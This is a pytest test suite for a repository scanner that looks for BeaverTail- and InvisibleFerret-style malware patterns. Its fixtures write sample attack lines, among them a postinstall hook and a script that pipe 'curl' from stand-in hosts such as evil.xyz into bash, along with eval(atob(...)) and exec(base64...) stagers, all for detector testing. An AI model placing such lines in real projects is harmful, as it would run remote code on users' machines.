"""Integration tests for contagious_scan.scanner.

Runs the scanner against temporary Git repository fixtures and asserts
correct findings, file discovery behaviour, and result structure.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

try:
    import git
    from git import Repo
    GIT_AVAILABLE = True
except ImportError:
    GIT_AVAILABLE = False

from contagious_scan.scanner import (
    ScanConfig,
    ScanResult,
    Scanner,
    scan,
)
from contagious_scan.detectors import Finding


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def benign_repo(tmp_path: Path) -> Path:
    """Create a minimal benign Git repository."""
    repo_dir = tmp_path / "benign_repo"
    repo_dir.mkdir()

    if GIT_AVAILABLE:
        repo = Repo.init(str(repo_dir))
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "t@t.com").release()

    (repo_dir / "index.js").write_text(
        "function greet(name) { return 'Hello, ' + name; }\n"
        "module.exports = { greet };\n"
    )
    (repo_dir / "utils.py").write_text(
        "def add(a, b):\n    return a + b\n"
    )
    (repo_dir / "package.json").write_text(
        json.dumps({
            "name": "benign-app",
            "version": "1.0.0",
            "scripts": {"test": "jest", "build": "webpack"},
            "dependencies": {"lodash": "^4.17.21"},
        })
    )

    if GIT_AVAILABLE:
        repo.index.add(["index.js", "utils.py", "package.json"])
        repo.index.commit("Initial commit")

    return repo_dir


@pytest.fixture()
def malicious_repo(tmp_path: Path) -> Path:
    """Create a Git repository with malicious file patterns."""
    repo_dir = tmp_path / "malicious_repo"
    repo_dir.mkdir()

    if GIT_AVAILABLE:
        repo = Repo.init(str(repo_dir))
        repo.config_writer().set_value("user", "name", "Test").release()
        repo.config_writer().set_value("user", "email", "t@t.com").release()

    # BeaverTail-style loader
    (repo_dir / "loader.js").write_text(
        "const keytar = require('keytar');\n"
        "eval(atob('SGVsbG8gV29ybGQ='));\n"
    )

    # InvisibleFerret stager
    (repo_dir / "stager.py").write_text(
        "import base64\n"
        "exec(base64.b64decode('aGVsbG8='))\n"
    )

    # Malicious package.json
    (repo_dir / "package.json").write_text(
        json.dumps({
            "name": "malicious-pkg",
            "scripts": {
                "postinstall": "curl https://evil.xyz/install.sh | bash"
            },
            "dependencies": {"dev-utils-pro": "^1.0.0"},
        })
    )

    if GIT_AVAILABLE:
        repo.index.add(["loader.js", "stager.py", "package.json"])
        repo.index.commit("Initial commit")

    return repo_dir


@pytest.fixture()
def plain_directory(tmp_path: Path) -> Path:
    """Create a plain directory (not a Git repo) with scannable files."""
    d = tmp_path / "plain_dir"
    d.mkdir()
    (d / "script.sh").write_text("curl https://evil.top/x.sh | bash\n")
    (d / "benign.py").write_text("print('hello')\n")
    return d


# ---------------------------------------------------------------------------
# ScanConfig tests
# ---------------------------------------------------------------------------


class TestScanConfig:
    """Tests for ScanConfig validation."""

    def test_default_config(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path)
        assert config.staged_only is False
        assert config.min_severity == "info"
        assert config.include_history is False

    def test_invalid_min_severity_raises(self, tmp_path: Path) -> None:
        with pytest.raises(ValueError, match="Invalid min_severity"):
            ScanConfig(target_path=tmp_path, min_severity="unknown")

    def test_valid_severities_accepted(self, tmp_path: Path) -> None:
        for sev in ["critical", "high", "medium", "info"]:
            config = ScanConfig(target_path=tmp_path, min_severity=sev)
            assert config.min_severity == sev

    def test_target_path_coerced_to_path(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=str(tmp_path))
        assert isinstance(config.target_path, Path)

    def test_min_severity_lowercased(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path, min_severity="HIGH")
        assert config.min_severity == "high"


# ---------------------------------------------------------------------------
# ScanResult tests
# ---------------------------------------------------------------------------


class TestScanResult:
    """Tests for ScanResult properties and serialisation."""

    def _make_result(self, findings: list[Finding]) -> ScanResult:
        return ScanResult(
            repository="/test/repo",
            scan_timestamp="2024-01-01T00:00:00Z",
            findings=findings,
            scanned_files=["file1.js", "file2.py"],
            skipped_files=[],
            errors=[],
            config=ScanConfig(target_path="."),
            elapsed_seconds=1.0,
        )

    def _make_finding(self, severity: str) -> Finding:
        return Finding(
            severity=severity,
            file_path="test.js",
            line_number=1,
            pattern_id=f"TEST_{severity.upper()}",
            description=f"{severity} test finding",
            matched_text="match",
            remediation="fix",
            tags=frozenset(),
        )

    def test_total_findings(self) -> None:
        findings = [self._make_finding("critical"), self._make_finding("high")]
        result = self._make_result(findings)
        assert result.total_findings == 2

    def test_has_critical_true(self) -> None:
        result = self._make_result([self._make_finding("critical")])
        assert result.has_critical is True

    def test_has_critical_false(self) -> None:
        result = self._make_result([self._make_finding("high")])
        assert result.has_critical is False

    def test_has_high_or_above(self) -> None:
        result = self._make_result([self._make_finding("high")])
        assert result.has_high_or_above is True

    def test_findings_by_severity(self) -> None:
        findings = [
            self._make_finding("critical"),
            self._make_finding("high"),
            self._make_finding("high"),
        ]
        result = self._make_result(findings)
        by_sev = result.findings_by_severity
        assert len(by_sev["critical"]) == 1
        assert len(by_sev["high"]) == 2

    def test_to_dict_keys(self) -> None:
        result = self._make_result([])
        d = result.to_dict()
        expected = {
            "scan_timestamp", "repository", "total_findings",
            "severity_summary", "findings", "scanned_files_count",
            "skipped_files_count", "errors", "elapsed_seconds",
        }
        assert set(d.keys()) == expected

    def test_to_dict_is_json_serialisable(self) -> None:
        result = self._make_result([self._make_finding("high")])
        import json
        json_str = json.dumps(result.to_dict())  # must not raise
        data = json.loads(json_str)
        assert data["total_findings"] == 1


# ---------------------------------------------------------------------------
# Scanner with plain directory (no git dependency)
# ---------------------------------------------------------------------------


class TestScannerPlainDirectory:
    """Tests that run against a plain directory without requiring Git."""

    def test_scan_finds_malicious_pattern(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory, min_severity="info")
        result = Scanner(config).run()
        assert result.total_findings > 0

    def test_scan_result_has_repository_label(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert str(plain_directory.resolve()) in result.repository

    def test_scan_returns_scan_result(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert isinstance(result, ScanResult)

    def test_scan_records_scanned_files(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert len(result.scanned_files) > 0

    def test_scan_has_no_errors(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.errors == []

    def test_scan_nonexistent_path_returns_errors(self, tmp_path: Path) -> None:
        config = ScanConfig(target_path=tmp_path / "does_not_exist")
        result = Scanner(config).run()
        assert len(result.errors) > 0
        assert result.total_findings == 0

    def test_min_severity_filters_findings(self, plain_directory: Path) -> None:
        config_all = ScanConfig(target_path=plain_directory, min_severity="info")
        config_critical = ScanConfig(target_path=plain_directory, min_severity="critical")
        result_all = Scanner(config_all).run()
        result_critical = Scanner(config_critical).run()
        assert result_critical.total_findings <= result_all.total_findings

    def test_findings_sorted_by_severity(self, plain_directory: Path) -> None:
        from contagious_scan.signatures import severity_rank
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        for i in range(len(result.findings) - 1):
            assert (
                severity_rank(result.findings[i].severity)
                >= severity_rank(result.findings[i + 1].severity)
            )

    def test_no_duplicate_findings(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        keys = [
            (f.file_path, f.line_number, f.pattern_id)
            for f in result.findings
        ]
        assert len(keys) == len(set(keys))

    def test_elapsed_seconds_positive(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.elapsed_seconds >= 0

    def test_scan_timestamp_format(self, plain_directory: Path) -> None:
        config = ScanConfig(target_path=plain_directory)
        result = Scanner(config).run()
        assert result.scan_timestamp.endswith("Z")


# ---------------------------------------------------------------------------
# Scanner with Git repository (requires GitPython)
# ---------------------------------------------------------------------------


@pytest.mark.skipif(not GIT_AVAILABLE, reason="GitPython not installed")
class TestScannerGitRepo:
    """Tests for Scanner with Git repositories."""

    def test_benign_repo_no_critical_findings(self, benign_repo: Path) -> None:
        config = ScanConfig(target_path=benign_repo, min_severity="critical")
        result = Scanner(config).run()
        assert result.has_critical is False

    def test_malicious_repo_has_critical_findings(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo, min_severity="info")
        result = Scanner(config).run()
        assert result.has_critical is True

    def test_malicious_repo_detects_beavertail(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        pattern_ids = {f.pattern_id for f in result.findings}
        assert any(
            pid.startswith("BT_") or "EVAL_ATOB" in pid
            for pid in pattern_ids
        )

    def test_malicious_repo_detects_lifecycle_hooks(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        lh_findings = [
            f for f in result.findings
            if "lifecycle-hook" in f.tags or "LH_" in f.pattern_id
        ]
        assert len(lh_findings) > 0

    def test_malicious_repo_detects_suspicious_packages(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        pkg_findings = [
            f for f in result.findings if "PKG_" in f.pattern_id
        ]
        assert len(pkg_findings) > 0

    def test_scan_records_js_files(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        js_files = [f for f in result.scanned_files if f.endswith(".js")]
        assert len(js_files) > 0

    def test_scan_records_py_files(self, malicious_repo: Path) -> None:
        config = ScanConfig(target_path=malicious_repo)
        result = Scanner(config).run()
        py_files = [f for f in result.scanned_files if f.endswith(".py")]
        assert len(py_files) > 0


# ---------------------------------------------------------------------------
# scan() convenience function tests
# ---------------------------------------------------------------------------


class TestScanFunction:
    """Tests for the scan() convenience function."""

    def test_scan_returns_scan_result(self, plain_directory: Path) -> None:
        result = scan(plain_directory)
        assert isinstance(result, ScanResult)

    def test_scan_with_min_severity(self, plain_directory: Path) -> None:
        result = scan(plain_directory, min_severity="critical")
        assert isinstance(result, ScanResult)
        for f in result.findings:
            from contagious_scan.signatures import severity_rank
            assert severity_rank(f.severity) >= severity_rank("critical")

    def test_scan_with_extra_detector(self, plain_directory: Path) -> None:
        from contagious_scan.detectors import Finding

        def custom_detector(content: str, file_path: str) -> list[Finding]:
            if "hello" in content.lower():
                return [
                    Finding(
                        severity="info",
                        file_path=file_path,
                        line_number=1,
                        pattern_id="CUSTOM_HELLO",
                        description="Custom detector: found 'hello'",
                        matched_text="hello",
                        remediation="n/a",
                        tags=frozenset({"custom"}),
                    )
                ]
            return []

        result = scan(
            plain_directory,
            extra_detectors=[custom_detector],
            min_severity="info",
        )
        custom_findings = [
            f for f in result.findings if f.pattern_id == "CUSTOM_HELLO"
        ]
        assert len(custom_findings) > 0

    def test_scan_nonexistent_path(self, tmp_path: Path) -> None:
        result = scan(tmp_path / "ghost")
        assert len(result.errors) > 0

    def test_scan_progress_callback_called(self, plain_directory: Path) -> None:
        calls: list[tuple[str, int, int]] = []

        def callback(path: str, done: int, total: int) -> None:
            calls.append((path, done, total))

        result = scan(plain_directory, progress_callback=callback)
        if result.scanned_files:
            assert len(calls) > 0


# ---------------------------------------------------------------------------
# Scanner skip_extensions tests
# ---------------------------------------------------------------------------


class TestScannerSkipExtensions:
    """Tests for extension-based file skipping."""

    def test_skip_js_extension(self, plain_directory: Path) -> None:
        # Create a .js file with malicious content
        (plain_directory / "evil.js").write_text("eval(atob('payload'))")

        config_no_skip = ScanConfig(target_path=plain_directory)
        config_skip = ScanConfig(
            target_path=plain_directory,
            skip_extensions=frozenset({".js"}),
        )
        result_no_skip = Scanner(config_no_skip).run()
        result_skip = Scanner(config_skip).run()

        js_findings_no_skip = [f for f in result_no_skip.findings if f.file_path.endswith(".js")]
        js_findings_skip = [f for f in result_skip.findings if f.file_path.endswith(".js")]

        # Skipping .js should result in fewer (or zero) .js findings
        assert len(js_findings_skip) <= len(js_findings_no_skip)
